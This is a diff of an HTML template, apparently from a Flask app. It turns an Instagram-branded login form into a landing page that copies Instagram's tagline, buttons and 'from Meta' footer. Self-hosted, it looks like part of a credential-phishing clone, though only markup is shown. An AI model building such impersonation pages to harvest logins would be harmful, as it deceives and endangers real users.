@@ -2,21 +2,34 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Login • Instagram</title>
+    <title>Instagram</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-box">
-            <h1>Instagram</h1>
-            <form action="/login" method="POST">
-                <input type="text" name="username" placeholder="Phone number, username, or email" required>
-                <input type="password" name="password" placeholder="Password" required>
-                <button type="submit">Log in</button>
-            </form>
-            <div class="or-separator">OR</div>
-            <a href="#" class="forgot-password">Forgot password?</a>
+    <div class="landing-container">
+        <!-- Top bar -->
+        <div class="top-nav">
+            <span class="logo-text">Instagram</span>
+            <div class="nav-buttons">
+                <a href="/login">Log in</a>
+                <button class="open-app-btn">Open app</button>
+            </div>
         </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <h1 class="big-logo">Instagram</h1>
+            <p class="tagline">Share <b>everyday moments</b> with your close friends.</p>
+            
+            <button class="cta-btn">Open Instagram</button>
+            
+            <div class="auth-links">
+                <a href="/login">Log In</a> or <a href="/signup">Sign Up</a>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">from <br> <b>Meta</b></div>
     </div>
 </body>
 </html>
